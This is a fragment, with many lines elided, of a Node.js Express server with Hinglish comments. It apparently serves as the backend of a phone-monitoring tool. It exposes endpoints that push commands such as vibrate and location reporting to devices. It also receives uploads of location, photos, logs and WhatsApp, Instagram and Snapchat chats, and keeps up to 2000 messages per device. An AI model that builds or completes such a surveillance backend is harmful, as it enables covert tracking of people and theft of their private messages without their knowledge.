...
app.use(cors({ origin: '*' }));
// Limit badhaya taaki photos aur bade logs aa sakein
...
app.post('/api/status', (req, res) => {
    try {
        ...
        if (devicesStatus[id] && devicesStatus[id].command) {
            ...
            // 🔥 IMPORTANT: Command bhejne ke baad use 'none' kar do
            // Taaki phone baar-baar vibrate na kare ya location na bhejta rahe
        ...
        devicesStatus[id] = {
            ...
            lon: currentLon,
            lastSeen: Date.now(),
            // Command ko yahan overwrite mat karna, upar handle ho gaya
...
app.post('/api/send-command', (req, res) => {
    ...
    console.log(`🚀 [COMMAND] Sending '${command}' to ${id}`);
    
    res.json({ status: "success", command: command });
});

// --- 5. DATA UPLOAD (UPDATED) ---
app.post('/api/upload_data', (req, res) => {
    ...
    try {
        ...
        if (type === 'location') {
            ...
            // File me save karo (Overwrite taaki storage na bhare, ya Append chaho to logic badal lena)
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
            console.log(`📍 [LOCATION] Updated for ${id}`);
        }
        
        // --- B. LIST DATA (Chats, Logs, Social Media) ---
        // Yahan naye types add kiye hain: whatsapp, instagram, snapchat
        else if ([
            ...
            // Limit: Sirf last 2000 messages rakho taaki file heavy na ho
